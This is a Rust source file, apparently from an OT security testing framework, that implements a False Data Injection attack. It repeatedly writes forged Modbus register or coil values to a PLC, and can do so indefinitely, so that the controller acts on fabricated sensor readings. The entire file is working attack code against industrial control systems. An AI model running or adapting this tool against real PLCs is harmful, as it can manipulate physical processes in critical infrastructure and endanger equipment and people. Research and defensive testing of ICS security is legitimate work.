/// False Data Injection: continuously write a forged Modbus value at a fixed interval.
///
/// Implements the core attack from SCASS §6.3.1: an attacker with OT network access
/// periodically writes fabricated register/coil values to a PLC, causing its control
/// logic to act on false sensor readings.
use anyhow::Result;
use crate::core::modbus::{write_single_coil, write_single_register, effective_port};
use std::time::{Duration, Instant};

#[derive(Copy, Clone)]
pub enum FdiTarget {
    Register,
    Coil,
}

/// Write a forged value to `address` on `ip` every `interval_s` seconds.
///
/// `count = 0` runs indefinitely (until the process receives Ctrl-C).
/// `count > 0` stops after exactly that many writes.
pub fn fdi_loop(
    ip: &str,
    port: u16,
    address: u16,
    value: u16,
    target: FdiTarget,
    interval_s: u64,
    count: u64,
) -> Result<()> {
    let modbus_port = effective_port(port);
    let interval = Duration::from_secs(interval_s.max(1));
    let mut writes: u64 = 0;

    loop {
        let started = Instant::now();
        let result = match target {
            FdiTarget::Register => write_single_register(ip, modbus_port, address, value),
            FdiTarget::Coil => write_single_coil(ip, modbus_port, address, value != 0),
        };
        writes += 1;

        match result {
            Ok(()) => {
                let label = match target {
                    FdiTarget::Register => format!("HR[{address}] = {value}"),
                    FdiTarget::Coil => {
                        let s = if value != 0 { "ON" } else { "OFF" };
                        format!("Coil[{address}] = {s}")
                    }
                };
                println!("[{writes:>4}] FDI write OK: {label}");
            }
            Err(e) => {
                println!("[{writes:>4}] FDI write FAILED: {e}");
            }
        }

        if count > 0 && writes >= count {
            break;
        }

        let elapsed = started.elapsed();
        if elapsed < interval {
            std::thread::sleep(interval.checked_sub(elapsed).unwrap());
        }
    }

    Ok(())
}
